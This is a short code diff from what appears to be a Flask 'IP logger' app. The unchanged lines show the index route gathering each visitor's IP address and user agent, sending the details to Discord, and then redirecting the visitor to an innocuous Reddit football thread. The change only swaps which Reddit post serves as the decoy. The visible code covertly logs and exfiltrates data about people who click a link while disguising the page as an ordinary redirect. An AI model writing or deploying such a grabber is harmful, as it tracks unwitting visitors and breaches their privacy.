@@ -74,7 +74,7 @@ def index():
         info = get_visitor_info(ip, user_agent)
         send_to_discord(info)
 
-    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
+    return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
